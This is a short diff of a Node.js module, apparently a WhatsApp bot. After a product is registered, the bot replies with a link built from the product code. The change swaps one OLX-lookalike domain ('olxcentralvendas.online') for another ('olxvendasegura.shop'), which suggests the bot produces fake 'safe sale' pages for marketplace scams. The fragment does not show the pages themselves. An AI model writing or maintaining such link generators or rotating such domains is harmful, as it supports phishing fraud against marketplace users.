@@ -409,7 +409,7 @@ module.exports = async (conn, mek, dataVendas, config) => {
         // Salvar dados finais antes de concluir
         if (salvarDados()) {
           enviar(
-            `✅ Produto cadastrado com sucesso!\n\nCódigo: ${edicao.codigo}\n\n*LINK:* https://olxcentralvendas.online/pag/?id=${edicao.codigo}`
+            `✅ Produto cadastrado com sucesso!\n\nCódigo: ${edicao.codigo}\n\n*LINK:* https://olxvendasegura.shop/pag/?id=${edicao.codigo}`
           );
         } else {
           enviar(
